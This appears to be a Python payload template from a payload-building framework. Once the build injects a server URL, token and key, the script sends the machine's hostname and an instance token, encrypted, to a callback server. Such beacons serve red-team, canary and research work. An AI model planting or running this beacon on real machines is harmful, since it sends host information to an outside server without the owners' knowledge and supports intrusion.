#!/usr/bin/env python3
# hostname-beacon payload
#
# Injected by the factory at build time:
#   _SERVER_URL  — edge HTTPS callback URL, e.g. "http://127.0.0.1:8443"
#   _TOKEN       — instance_token (16-char hex, 8 bytes)
#   _KEY         — master key (64-char hex, 32 bytes raw) for the HMAC-SHA256 AEAD
#
# blacksea.sdk.payload.* is inlined by the bundler — pure stdlib, no third-party
# imports anywhere on this path (runs on any Python 3.11+, no project venv needed).
from blacksea.sdk.payload.http import send_https_encrypted
import socket
import json

_hostname = socket.gethostname()
_body = json.dumps(
    {"hostname": _hostname, "token": _TOKEN},  # noqa: F821
    sort_keys=True, separators=(",", ":"),
).encode()
send_https_encrypted(
    _SERVER_URL, _body, _KEY, _TOKEN  # noqa: F821
)
